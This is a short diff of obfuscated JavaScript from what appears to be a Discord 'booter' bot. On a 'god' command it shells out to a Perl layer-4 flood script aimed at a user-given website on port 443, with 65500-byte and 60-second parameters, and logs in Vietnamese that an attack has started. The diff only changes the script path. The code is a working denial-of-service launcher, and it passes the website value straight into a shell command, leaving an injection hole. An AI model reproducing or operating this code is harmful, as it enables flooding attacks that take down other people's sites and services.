@@ -43,7 +43,7 @@ module['exports'] = {
         if (_0xf396x9 === 'god') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`perl vip/L4/${method}.pl ${website} 443 65500 60`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L4 && perl ${method}.pl ${website} 443 65500 60`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
